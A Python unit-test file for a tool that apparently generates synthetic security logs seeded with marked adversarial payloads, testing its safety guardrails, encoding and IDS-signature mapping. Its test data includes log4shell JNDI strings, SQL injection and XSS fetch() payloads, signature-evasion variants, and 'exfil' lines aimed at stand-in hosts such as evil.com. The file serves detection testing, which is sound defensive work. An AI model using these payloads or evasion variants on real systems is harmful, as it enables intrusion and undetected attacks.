# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Unit tests for the adversarial_payload event type: model, templated families,
inverted safety guardrails (control bytes permitted, marker/host enforced),
per-surface encoding, and machine-readable ground truth."""

import hashlib
from datetime import UTC, datetime
from pathlib import Path

import pytest
from pydantic import ValidationError

from evidenceforge.config.payload_families import (
    canary_host,
    default_marker,
    family_names,
    get_family,
    load_payload_families,
    payload_markers,
)
from evidenceforge.config.schemas import PayloadFamiliesConfig, PayloadFamilyEntry
from evidenceforge.generation import adversarial_payload as ap
from evidenceforge.generation.ground_truth import GroundTruthGenerator
from evidenceforge.models.scenario import AdversarialPayloadEventSpec, StorylineEvent

# --- Model ---------------------------------------------------------------------


class TestAdversarialPayloadModel:
    def test_family_only_is_valid(self):
        spec = AdversarialPayloadEventSpec(surface="syslog_message", family="ansi_escape")
        assert spec.type == "adversarial_payload" and spec.value is None

    def test_value_only_is_valid(self):
        spec = AdversarialPayloadEventSpec(surface="syslog_message", value="EFORGE_TEST x")
        assert spec.value == "EFORGE_TEST x" and spec.family is None

    def test_both_rejected(self):
        with pytest.raises(ValidationError, match="exactly one"):
            AdversarialPayloadEventSpec(surface="syslog_message", family="ansi_escape", value="x")

    def test_neither_rejected(self):
        with pytest.raises(ValidationError, match="exactly one"):
            AdversarialPayloadEventSpec(surface="syslog_message")

    @pytest.mark.parametrize(
        "surface",
        [
            "http_user_agent",
            "http_request_url",
            "http_referrer",
            "syslog_message",
            "process_command_line",
        ],
    )
    def test_all_v1_surfaces_accepted(self, surface):
        assert AdversarialPayloadEventSpec(surface=surface, value="EFORGE_TEST").surface == surface

    @pytest.mark.parametrize("bad", ["shell_history", "proxy_header", "windows_4688", ""])
    def test_emitter_or_unmodeled_surface_rejected(self, bad):
        with pytest.raises(ValidationError):
            AdversarialPayloadEventSpec(surface=bad, value="EFORGE_TEST")

    def test_unknown_field_rejected(self):
        with pytest.raises(ValidationError):
            AdversarialPayloadEventSpec(surface="syslog_message", family="ansi_escape", carrier="x")

    @pytest.mark.parametrize("surface", ["http_user_agent", "http_request_url", "http_referrer"])
    def test_scheme_accepted_on_http_surfaces(self, surface):
        spec = AdversarialPayloadEventSpec(surface=surface, family="log4shell", scheme="http")
        assert spec.scheme == "http"

    @pytest.mark.parametrize("surface", ["syslog_message", "process_command_line"])
    def test_scheme_rejected_on_non_http_surfaces(self, surface):
        with pytest.raises(ValidationError, match="scheme is only valid"):
            AdversarialPayloadEventSpec(surface=surface, value="EFORGE_TEST x", scheme="http")

    def test_routes_through_discriminated_union(self):
        event = StorylineEvent(
            id="s1",
            time="+1h",
            actor="nina",
            system="APP-SRV-01",
            activity="inject",
            events=[
                {"type": "adversarial_payload", "surface": "http_user_agent", "family": "log4shell"}
            ],
        )
        assert isinstance(event.events[0], AdversarialPayloadEventSpec)


# --- Templated families + schema -----------------------------------------------


class TestPayloadFamiliesData:
    def test_curated_family_set_present(self):
        names = family_names()
        assert {"ansi_escape", "crlf_log_forging", "csv_formula", "log4shell"} <= names

    def test_schema_validates_bundled_config(self):
        PayloadFamiliesConfig(**load_payload_families())

    def test_schema_rejects_nondistinctive_marker(self):
        # Marker matching is substring-based and the per-line marker is the SOLE
        # synthetic guarantee, so a generic lowercase word must be rejected at load.
        cfg = load_payload_families()
        with pytest.raises(ValidationError, match="distinctive"):
            PayloadFamiliesConfig(**{**cfg, "default_marker": "status", "markers": ["status"]})

    def test_every_family_synthesizes_a_safe_value(self):
        # Each family must produce a payload that passes the (inverted) guardrails:
        # marker on every physical line, only allowlisted/canary hosts.
        for fam in load_payload_families()["families"]:
            for i in range(6):
                value = ap.synthesize_value(fam["name"], f"ap:e{i}:{fam['name']}")
                ap.check_payload_safety(value, family=fam["name"])  # must not raise

    def test_accessors(self):
        assert default_marker() in payload_markers()
        assert canary_host().endswith(".invalid")
        assert get_family("ansi_escape") is not None
        assert get_family("does_not_exist") is None

    def test_raw_surfaces_are_a_subset_of_surfaces(self):
        for fam in load_payload_families()["families"]:
            assert set(fam.get("raw_surfaces") or ()) <= set(fam.get("surfaces") or ())

    def test_marker_appears_in_every_value_template(self):
        # Every templated payload (single value_template OR every value_templates variant)
        # must carry a marker token so its synthesized value is self-evidently synthetic
        # on every line it produces.
        for fam in load_payload_families()["families"]:
            for template in [fam.get("value_template"), *(fam.get("value_templates") or [])]:
                if template:
                    assert "{marker}" in template, (fam["name"], template)

    def test_every_variant_of_every_family_is_safe(self):
        # value_templates ship the canonical form PLUS evasion variants; EVERY variant
        # (not just one sampled per synthesis) must pass the inverted guardrails.
        for fam in load_payload_families()["families"]:
            for variant in ap.expand_family_variants(fam["name"], f"variants:{fam['name']}"):
                ap.check_payload_safety(variant, family=fam["name"])  # must not raise

    def test_mapped_ids_sids_resolve_to_real_signatures(self):
        # A family's ids_sid must point at a real curated signature, else a cleartext
        # http payload would silently fail to attach the on-wire IDS alert.
        from evidenceforge.generation.activity.ids_signatures import signature_by_sid

        for fam in load_payload_families()["families"]:
            sid = fam.get("ids_sid")
            if sid is not None:
                assert signature_by_sid(int(sid)) is not None, (fam["name"], sid)

    def test_signature_by_sid_unknown_returns_none(self):
        from evidenceforge.generation.activity.ids_signatures import signature_by_sid

        assert signature_by_sid(999999999) is None

    def test_ids_sid_without_http_surface_rejected(self):
        # An on-wire signature only fires on a cleartext http request, so a family with
        # ids_sid but no http_* surface is a configuration error.
        with pytest.raises(ValidationError, match="http_. surface"):
            PayloadFamilyEntry(
                name="bad",
                value_template="{marker} x",
                surfaces=["syslog_message"],
                ids_sid=2024317,
            )

    def test_ids_sid_without_fires_on_token_rejected(self):
        # ids_sid without ids_fires_on would make the signature fire on EVERY variant
        # (including the evasion variants it is designed to miss) — a hard config error.
        with pytest.raises(ValidationError, match="ids_fires_on"):
            PayloadFamilyEntry(
                name="bad",
                value_template="{marker} ${jndi:ldap://canary.eforge.invalid/{marker}}",
                surfaces=["http_user_agent"],
                ids_sid=2024317,
            )

    def test_ids_fires_on_without_sid_rejected(self):
        with pytest.raises(ValidationError, match="no ids_sid"):
            PayloadFamilyEntry(
                name="bad",
                value_template="{marker} x",
                surfaces=["http_user_agent"],
                ids_fires_on="x",
            )

    def test_ids_signature_fires_only_on_token_bearing_variant(self):
        # The on-wire IDS alert must fire iff the rendered payload still contains the
        # signature's flat content token — an obfuscated/evasion variant produces NO
        # alert (the detection-gap the dataset exercises). Sweep EVERY variant of every
        # mapped family and assert the fire decision matches token-presence exactly.
        for fam in load_payload_families()["families"]:
            token = fam.get("ids_fires_on")
            if not token:
                continue
            sid = int(fam["ids_sid"])
            for variant in ap.expand_family_variants(fam["name"], f"fire:{fam['name']}"):
                fired = ap.ids_signature_for_payload(fam["name"], variant)
                expected = sid if token.lower() in variant.lower() else None
                assert fired == expected, (fam["name"], variant)

    def test_ids_signature_canonical_fires_obfuscated_evades(self):
        # Spot-check the headline cases the feature's value depends on.
        f = ap.ids_signature_for_payload
        assert f("log4shell", "EFORGE_TEST ${jndi:ldap://canary.eforge.invalid/x}") == 2024317
        assert f("log4shell", "EFORGE_TEST ${${lower:j}ndi:ldap://canary.eforge.invalid/x}") is None
        assert f("sql_injection", "x' UNION SELECT a,b FROM users-- x") == 2009714
        assert f("sql_injection", "x'/**/UNION/**/SELECT/**/a,b/**/FROM/**/users-- x") is None
        # unmapped family and literal value (no family) never auto-fire
        assert (
            f("xss_reflection", "<script>fetch('https://canary.eforge.invalid/x')</script>x")
            is None
        )
        assert f("", "EFORGE_TEST ${jndi:ldap://canary.eforge.invalid/x}") is None
        assert f(None, "anything") is None


# --- Inverted safety guardrails ------------------------------------------------


class TestSafety:
    @pytest.mark.parametrize(
        "value",
        [
            "EFORGE_TEST \x1b[31mred\x1b[0m EFORGE_TEST",  # raw ANSI escape — PERMITTED
            "field=EFORGE_TEST\r\nforged: status=ok EFORGE_TEST",  # CRLF, both lines marked
            "EFORGE_TEST ${jndi:ldap://canary.eforge.invalid/EFORGE_TEST}",
            "EFORGE_TEST <script>fetch('https://example.com/x')</script> EFORGE_TEST",
        ],
    )
    def test_control_bytes_and_marked_payloads_accepted(self, value):
        # The inversion from spillage: control bytes are the modeled weakness, so a
        # marked, allowlisted-host payload carrying them must be ACCEPTED.
        ap.check_payload_safety(value, family=None)

    def test_safety_and_render_stay_linear_on_oversized_payloads(self):
        # The deterministic engine must stay fast: the safety host-extraction and the
        # per-surface render must NOT scale O(n^2) on a multi-KB field (the oversized_field
        # family is the feature's own multi-KB primitive). Regression guard for the
        # backtracking host-extraction regexes — an O(n^2) pass over 32 KB takes ~0.6s+,
        # the linear path is well under a millisecond.
        import time

        big = "EFORGE_TEST OVERSIZED-FIELD-PADDING-" + ("a" * 32768) + "-END EFORGE_TEST"
        start = time.perf_counter()
        ap.check_payload_safety(big, family=None)
        for surface in ("syslog_message", "http_request_url", "process_command_line"):
            ap.render_for_surface(big, surface, None, "perf")
        elapsed = time.perf_counter() - start
        assert elapsed < 0.25, (
            f"oversized payload handling took {elapsed:.3f}s (O(n^2) regression?)"
        )

    def test_unmarked_payload_rejected(self):
        with pytest.raises(ap.AdversarialPayloadSafetyError, match="poison marker"):
            ap.check_payload_safety("just a normal log line", family=None)

    def test_crlf_forged_line_without_marker_rejected(self):
        # A forged second line that drops the marker is the dangerous case the marker
        # invariant exists to prevent — it would not be self-evidently synthetic.
        with pytest.raises(ap.AdversarialPayloadSafetyError, match="poison marker"):
            ap.check_payload_safety("EFORGE_TEST field=x\r\nforged: status=cleared", family=None)

    @pytest.mark.parametrize(
        "value",
        [
            "EFORGE_TEST ${jndi:ldap://evil-real-site.com/x}",  # bare real host
            "EFORGE_TEST <script>fetch('https://8.8.8.8/x')</script>",  # public IP
            "EFORGE_TEST connect user@paypal.com",  # userinfo real host
        ],
    )
    def test_non_allowlisted_host_rejected(self, value):
        with pytest.raises(ap.AdversarialPayloadSafetyError):
            ap.check_payload_safety(value, family=None)

    def test_empty_payload_rejected(self):
        with pytest.raises(ap.AdversarialPayloadSafetyError, match="non-empty"):
            ap.check_payload_safety("", family=None)

    def test_unknown_family_rejected(self):
        with pytest.raises(ap.AdversarialPayloadSafetyError, match="unknown"):
            ap.check_payload_safety("EFORGE_TEST x", family="does_not_exist")

    def test_oob_host_substitutes_canary_only_when_registered(self):
        # Default: inert non-resolving canary. With a registered OOB host the family's
        # {canary} resolves to it (live callback), nothing else changes (same {alnum}).
        default = ap.synthesize_value("log4shell", "k")
        live = ap.synthesize_value("log4shell", "k", oob_host="x.oast.fun")
        assert "canary.eforge.invalid" in default and "oast.fun" not in default
        assert "x.oast.fun" in live and "canary.eforge.invalid" not in live

    def test_oob_host_accepted_by_safety_only_when_registered(self):
        # A real (non-reserved) callback host is rejected by default, accepted only when
        # the operator explicitly registers it (the fuzzer/Collaborator opt-in).
        val = "EFORGE_TEST ${jndi:ldap://abc.oast.fun/EFORGE_TEST}"
        with pytest.raises(ap.AdversarialPayloadSafetyError, match="non-allowlisted host"):
            ap.check_payload_safety(val)
        ap.check_payload_safety(val, oob_hosts=("oast.fun",))  # registered → accepted
        v, _ = ap.resolve_value("log4shell", None, seed_key="k", oob_hosts=("x.oast.fun",))
        assert "x.oast.fun" in v

    def test_oob_host_allowlist_is_case_insensitive(self):
        # Hosts compare case-insensitively (_extract_hosts lowercases), so a registered
        # OOB host must match regardless of the case it was registered in — otherwise a
        # bare uppercase reserved sinkhole crashes generation on the allowlist mismatch.
        val = "EFORGE_TEST ${jndi:ldap://oob-sink.local/EFORGE_TEST}"
        with pytest.raises(ap.AdversarialPayloadSafetyError):
            ap.check_payload_safety(val)  # .local is not allowlisted by default
        ap.check_payload_safety(val, oob_hosts=("OOB-SINK.LOCAL",))  # uppercase reg → accepted
        ap.check_payload_safety(val, oob_hosts=("oob-sink.local",))  # lowercase reg → accepted


# --- Synthesis + per-surface rendering -----------------------------------------


class TestSynthesisRendering:
    def test_synthesis_deterministic_per_seed(self):
        a = ap.synthesize_value("log4shell", "seedA")
        b = ap.synthesize_value("log4shell", "seedA")
        assert a == b

    def test_resolve_value_literal_path(self):
        value, fam = ap.resolve_value(None, "EFORGE_TEST literal", seed_key="k")
        assert value == "EFORGE_TEST literal" and fam == ""

    def test_resolve_value_requires_exactly_one(self):
        with pytest.raises(ap.AdversarialPayloadSafetyError, match="exactly one"):
            ap.resolve_value("log4shell", "EFORGE_TEST", seed_key="k")

    def test_family_on_undeclared_surface_raises(self):
        # csv_formula does not declare http_user_agent — render must refuse, not
        # silently produce an incoherent artifact.
        assert "http_user_agent" not in set(get_family("csv_formula").get("surfaces"))
        with pytest.raises(ap.AdversarialPayloadSafetyError, match="not valid on surface"):
            ap.render_for_surface("EFORGE_TEST x", "http_user_agent", "csv_formula", "k")

    def test_unsupported_surface_raises(self):
        with pytest.raises(ap.AdversarialPayloadSafetyError, match="unsupported"):
            ap.render_for_surface("EFORGE_TEST", "bogus_surface", None, "k")

    def test_syslog_raw_surface_keeps_control_bytes(self):
        # ansi_escape declares syslog_message raw, so the ESC byte survives verbatim.
        value = ap.synthesize_value("ansi_escape", "k")
        render = ap.render_for_surface(value, "syslog_message", "ansi_escape", "k")
        assert "\x1b" in render.encoded_value

    def test_process_command_line_has_no_raw_control_bytes(self):
        # The eCAR command_line must never carry a raw control byte (it would corrupt
        # the record); the encoder escapes them to a literal FIRST, then shell-quotes.
        # (Use a literal payload: ansi_escape does not declare process_command_line.)
        render = ap.render_for_surface(
            "EFORGE_TEST \x1b[31mx\x1b[0m EFORGE_TEST", "process_command_line", None, "k"
        )
        assert "\x1b" not in render.command
        assert "\\x1b" in render.command  # escaped to a literal

    def test_url_surface_percent_encodes_metacharacters(self):
        render = ap.render_for_surface(
            "EFORGE_TEST ${jndi:ldap://canary.eforge.invalid/EFORGE_TEST}",
            "http_request_url",
            "log4shell",
            "k",
        )
        assert "%24%7B" in render.encoded_value  # ${ percent-encoded
        assert " " not in render.encoded_value and "\n" not in render.encoded_value

    def test_user_agent_surface_neutralizes_quotes(self):
        render = ap.render_for_surface(
            'EFORGE_TEST "quote" EFORGE_TEST', "http_user_agent", None, "k"
        )
        assert '"' not in render.encoded_value  # cannot break out of the quoted UA field
        assert render.user_agent == render.encoded_value

    def test_expected_sources_match_surface_format_map(self):
        for surface, fmt in ap.SURFACE_FORMATS.items():
            assert ap.expected_sources_for_surface(surface) == (fmt,)

    def test_family_values_vary_per_event(self):
        # Per-event {alnum} variation: two events of the same family must not be
        # byte-identical, so the presence eval can tell two landings apart (and so
        # two identical payloads aren't a synthetic tell).
        for name in ("ansi_escape", "crlf_log_forging", "csv_formula", "log4shell"):
            a = ap.synthesize_value(name, "ap:e0")
            b = ap.synthesize_value(name, "ap:e1")
            assert a != b, name

    def test_csv_formula_renders_at_field_start(self):
        # CSV injection only fires when the exported cell BEGINS with a formula-trigger
        # character; the whole-field carrier must leave one of = + - @ as the first
        # character (the family ships all four trigger prefixes as evasion variants).
        for i in range(8):
            value = ap.synthesize_value("csv_formula", f"k{i}")
            render = ap.render_for_surface(value, "syslog_message", "csv_formula", f"k{i}")
            assert render.syslog_message[0] in "=+-@"

    def test_process_command_line_carrier_implies_no_side_effect(self):
        # The process carrier must be a local command (env/printenv/echo), never one
        # like `logger` that would imply a syslog write the engine never produces.
        render = ap.render_for_surface("EFORGE_TEST payload", "process_command_line", None, "k")
        assert "logger" not in render.command
        assert render.process_name in ("/usr/bin/env",)

    def test_windows_process_carrier_is_native(self):
        render = ap.render_for_surface(
            "EFORGE_TEST payload", "process_command_line", None, "k", os_category="windows"
        )
        assert render.process_name.lower().endswith("cmd.exe")

    def test_windows_process_image_is_full_system32_path(self):
        # Real Sysmon/eCAR always carries the FULL executable path; a bare "cmd.exe" image
        # would make the adversarial process record trivially filterable vs baseline. The
        # Windows carrier must render the full System32 path as the process image.
        for fam in ("oversized_field", "sql_injection", "ansi_escape"):
            render = ap.render_for_surface(
                ap.synthesize_value(fam, f"img:{fam}"),
                "process_command_line",
                fam,
                f"img:{fam}",
                os_category="windows",
            )
            assert render.process_name == r"C:\Windows\System32\cmd.exe", fam

    def test_carrier_with_non_allowlisted_host_raises(self):
        # render_for_surface re-checks the fully rendered line so a carrier-embedded
        # real host (not part of the value) cannot reach generation.
        from evidenceforge.config.payload_families import get_family

        fam = dict(get_family("log4shell"))
        fam["carriers"] = {"syslog_message": ["see https://evil-real-site.com/ {value}"]}
        with pytest.raises(ap.AdversarialPayloadSafetyError, match="non-allowlisted host"):
            # Patch the family lookup so render uses the malicious carrier.
            import evidenceforge.generation.adversarial_payload as apmod

            orig = apmod.get_family
            apmod.get_family = lambda n: fam if n == "log4shell" else orig(n)
            try:
                ap.render_for_surface(
                    ap.synthesize_value("log4shell", "k"), "syslog_message", "log4shell", "k"
                )
            finally:
                apmod.get_family = orig

    def test_xss_reflection_is_proposed_and_still_renders(self):
        fam = get_family("xss_reflection")
        assert fam.get("proposed") is True  # flagged for maintainer sign-off
        value = ap.synthesize_value("xss_reflection", "k")
        ap.check_payload_safety(value, family="xss_reflection")
        render = ap.render_for_surface(value, "http_request_url", "xss_reflection", "k")
        assert "%3Cscript%3E" in render.encoded_value  # percent-encoded <script>

    def test_carrier_callback_hosts_covers_url_vectors_not_binaries(self):
        # Parity with the value extractor's vectors: scheme://, scheme-relative //, and
        # userinfo @host (domain or dotted IPv4) — but never a bare binary token.
        assert ap._carrier_callback_hosts("x https://evil.com/a") == {"evil.com"}
        assert ap._carrier_callback_hosts("x //evil.com/a") == {"evil.com"}
        assert "evil.com" in ap._carrier_callback_hosts("exfil to user@evil.com here")
        assert "8.8.8.8" in ap._carrier_callback_hosts("ping user@8.8.8.8 now")  # IP userinfo
        assert ap._carrier_callback_hosts("cmd.exe /c set X=y") == set()

    @pytest.mark.parametrize(
        "carrier",
        [
            "see //evil-real-site.com/x {value}",  # scheme-relative authority
            "exfil to user@evil-real-site.com {value}",  # userinfo host
            "ping user@8.8.8.8 {value}",  # userinfo public IP
        ],
    )
    def test_carrier_scheme_relative_and_userinfo_host_rejected(self, carrier):
        import evidenceforge.generation.adversarial_payload as apmod

        fam = dict(get_family("log4shell"))
        fam["carriers"] = {"syslog_message": [carrier]}
        orig = apmod.get_family
        apmod.get_family = lambda n: fam if n == "log4shell" else orig(n)
        try:
            with pytest.raises(ap.AdversarialPayloadSafetyError, match="non-allowlisted host"):
                ap.render_for_surface(
                    ap.synthesize_value("log4shell", "k"), "syslog_message", "log4shell", "k"
                )
        finally:
            apmod.get_family = orig

    def test_referrer_host_has_no_doubled_label_or_reserved_pseudo_tld(self):
        import re as _re

        for i in range(24):
            r = ap.render_for_surface(
                ap.synthesize_value("log4shell", f"k{i}"), "http_referrer", "log4shell", f"k{i}"
            )
            host = _re.search(r"https://([^/]+)/", r.http_referrer).group(1)
            assert not host.startswith("portal.portal"), host  # no doubled prefix
            assert not host.endswith(".invalid"), host  # invalid is canary-only
            assert host.endswith((".com", ".org", ".net", ".test")), host

    def test_syslog_app_name_matches_carrier_tag(self):
        # APP-NAME must be coherent with a tagged carrier ("nginx:"/"webapp:"), not a
        # fixed value that contradicts the message a reviewer would grep.
        apps = set()
        for i in range(24):
            r = ap.render_for_surface(
                ap.synthesize_value("ansi_escape", f"s{i}"),
                "syslog_message",
                "ansi_escape",
                f"s{i}",
            )
            assert r.syslog_message.startswith(r.syslog_app + ":")
            apps.add(r.syslog_app)
        assert apps <= {"nginx", "webapp"}

    def test_syslog_app_name_falls_back_for_prefixless_carrier(self):
        # csv_formula's carrier is the bare formula (no daemon tag) — keep a generic app.
        r = ap.render_for_surface(
            ap.synthesize_value("csv_formula", "k"), "syslog_message", "csv_formula", "k"
        )
        assert r.syslog_message[0] in "=+-@"
        assert r.syslog_app == "webapp"


# --- Machine-readable ground truth ---------------------------------------------


def _ap_event(**over):
    base = {
        "type": "adversarial_payload",
        "storyline_cluster_id": "ap0",
        "actor": "nina",
        "system": "APP-SRV-01",
        "activity": "CRLF log forging in syslog",
        "time": datetime(2024, 3, 18, 14, 20, tzinfo=UTC),
        "surface": "syslog_message",
        "family": "crlf_log_forging",
        "value": "field=EFORGE_TEST\r\nforged: status=ok EFORGE_TEST",
        "rendered_value": "field=EFORGE_TEST\r\nforged: status=ok EFORGE_TEST",
        "expected_sources": ["syslog"],
        "encoding": "raw",
    }
    base.update(over)
    return base


class TestGroundTruth:
    def test_canonical_record_shape(self, scenarios_dir):
        # adversarial_payload is a kind in the canonical GROUND_TRUTH.json document;
        # the value/sha fields are populated and surface/encoding land in attributes.
        from evidenceforge.models.scenario import Scenario
        from evidenceforge.utils.files import load_yaml

        scenario = Scenario(**load_yaml(scenarios_dir / "adversarial_payload.yaml"))
        document = GroundTruthGenerator(scenario, [_ap_event()]).build_document()
        recs = [e for e in document.events if e.kind == "adversarial_payload"]
        assert len(recs) == 1
        rec = recs[0]
        assert rec.emitted
        assert rec.attributes.surface == "syslog_message"
        assert rec.attributes.encoding == "raw"
        assert rec.attributes.expected_sources == ["syslog"]
        assert rec.attributes.rendered_value == "field=EFORGE_TEST\r\nforged: status=ok EFORGE_TEST"
        assert rec.attributes.value_sha256  # hashed by the canonical builder

    def test_md_escapes_control_bytes_and_keeps_hash(self, scenarios_dir):
        from evidenceforge.models.scenario import Scenario
        from evidenceforge.utils.files import load_yaml

        scenario = Scenario(**load_yaml(scenarios_dir / "adversarial_payload.yaml"))
        ev = _ap_event(value="EFORGE_TEST \x1b[31mX\x1b[0m EFORGE_TEST", surface="syslog_message")
        gen = GroundTruthGenerator(scenario, [ev])
        detail = gen._format_event_details(ev)
        assert "\x1b" not in detail  # raw ESC must not leak into the Markdown
        digest = hashlib.sha256(ev["value"].encode("utf-8")).hexdigest()
        assert digest[:12] in detail
        assert "Adversarial payload" in detail and "raw" in detail


# --- Overlay merge + validate-config safety self-test --------------------------


@pytest.fixture
def _isolated_payload_families():
    from evidenceforge.config.payload_families import reset_payload_families_cache

    reset_payload_families_cache()
    yield
    reset_payload_families_cache()


def test_payload_families_overlay_merges(tmp_path, monkeypatch, _isolated_payload_families):
    overlay = tmp_path / ".eforge" / "config" / "activity"
    overlay.mkdir(parents=True)
    (overlay / "payload_families.yaml").write_text(
        "families:\n"
        "  - name: corp_marker_injection\n"
        '    description: "custom injection"\n'
        '    weakness_class: "log_forging"\n'
        '    value_template: "{marker} corp=injected {marker}"\n'
        "    surfaces:\n"
        "      - syslog_message\n"
        "markers:\n"
        "  - CUSTOM_MARK\n"
        "network_allowlist:\n"
        "  domains:\n"
        "    - corp.invalid\n"
    )
    monkeypatch.chdir(tmp_path)
    from evidenceforge.config.payload_families import reset_payload_families_cache

    reset_payload_families_cache()

    assert {"corp_marker_injection", "ansi_escape"} <= family_names()
    assert "CUSTOM_MARK" in payload_markers()
    value = ap.synthesize_value("corp_marker_injection", "ap:e:syslog_message")
    ap.check_payload_safety(value, family="corp_marker_injection")


def test_validate_config_rejects_overlay_with_too_loose_marker(monkeypatch):
    # An overlay whose marker is a generic lowercase word must be rejected — the
    # distinctiveness gate catches it at schema validation inside validate-config.
    import evidenceforge.config.payload_families as pf
    from evidenceforge.cli.validate_config import ValidationResult, _validate_payload_families

    monkeypatch.setattr(
        pf,
        "load_payload_families",
        lambda: {
            "families": [
                {
                    "name": "x",
                    "value_template": "{marker} injected",
                    "surfaces": ["syslog_message"],
                }
            ],
            "default_marker": "status",  # degenerate: matches benign "forged: status=..." text
            "markers": ["status"],
            "canary_host": "canary.eforge.invalid",
            "network_allowlist": {"domains": ["invalid"]},
        },
    )
    result = ValidationResult()
    _validate_payload_families(result)
    assert any(i.file == "payload_families.yaml" and i.severity == "ERROR" for i in result.issues)


def test_validate_config_rejects_overlay_carrier_with_real_host(monkeypatch):
    # A carrier embeds a host that is NOT part of the value, so check_payload_safety
    # alone never sees it. validate-config must render the carrier and reject a
    # non-allowlisted host before it could ever reach generation.
    import evidenceforge.config.payload_families as pf
    from evidenceforge.cli.validate_config import ValidationResult, _validate_payload_families

    monkeypatch.setattr(
        pf,
        "load_payload_families",
        lambda: {
            "families": [
                {
                    "name": "x",
                    "value_template": "{marker} payload {marker}",
                    "surfaces": ["syslog_message"],
                    "carriers": {
                        "syslog_message": ["callback to https://evil-real-site.com/ {value}"]
                    },
                }
            ],
            "default_marker": "EFORGE_TEST",
            "markers": ["EFORGE_TEST"],
            "canary_host": "canary.eforge.invalid",
            "network_allowlist": {"domains": ["invalid"]},
        },
    )
    result = ValidationResult()
    _validate_payload_families(result)
    assert any(
        i.file == "payload_families.yaml"
        and i.severity == "ERROR"
        and "non-allowlisted host" in i.message
        for i in result.issues
    )


def test_validate_config_checks_every_example_in_examples_family(monkeypatch):
    # An `examples` family must have EVERY example safety-checked — an unsafe example
    # among several must not slip through because a different one was sampled.
    import evidenceforge.config.payload_families as pf
    from evidenceforge.cli.validate_config import ValidationResult, _validate_payload_families

    monkeypatch.setattr(
        pf,
        "load_payload_families",
        lambda: {
            "families": [
                {
                    "name": "ex",
                    "examples": [
                        "EFORGE_TEST safe one",
                        "unmarked unsafe example",
                    ],  # 2nd: no marker
                    "surfaces": ["syslog_message"],
                }
            ],
            "default_marker": "EFORGE_TEST",
            "markers": ["EFORGE_TEST"],
            "canary_host": "canary.eforge.invalid",
            "network_allowlist": {"domains": ["invalid"]},
        },
    )
    result = ValidationResult()
    _validate_payload_families(result)
    assert any(i.file == "payload_families.yaml" and i.severity == "ERROR" for i in result.issues)


# --- Docs sync -----------------------------------------------------------------


class TestDocsSync:
    """Cheap grep gate: keep the skill docs and the reference doc in sync with the
    adversarial_payload feature, so a new artifact / scope change can't slip through
    undocumented."""

    _ROOT = Path(__file__).resolve().parents[2]

    def _read(self, rel: str) -> str:
        return (self._ROOT / rel).read_text(encoding="utf-8")

    def test_reference_doc_and_skills_reference_the_feature(self):
        assert (self._ROOT / "docs/reference/adversarial_payload.md").exists()
        assert "payload_families.yaml" in self._read("commands/eforge/config.md")
        assert "adversarial_payload" in self._read("commands/eforge/scenario.md")
        # Both ground-truth kinds share the sidecar; eval skill must say so.
        assert "adversarial_payload" in self._read("commands/eforge/evaluate.md")

    def test_validate_skill_documents_adversarial_payload_errors(self):
        # AGENTS.md convention: validate.md must carry error-handling guidance for new
        # event types. adversarial_payload has surface/family/value-specific errors.
        validate = self._read("commands/eforge/validate.md")
        assert "adversarial_payload" in validate
        assert "does not model surface" in validate  # the family↔surface error
        assert "web_server" in validate  # the http_* surface error
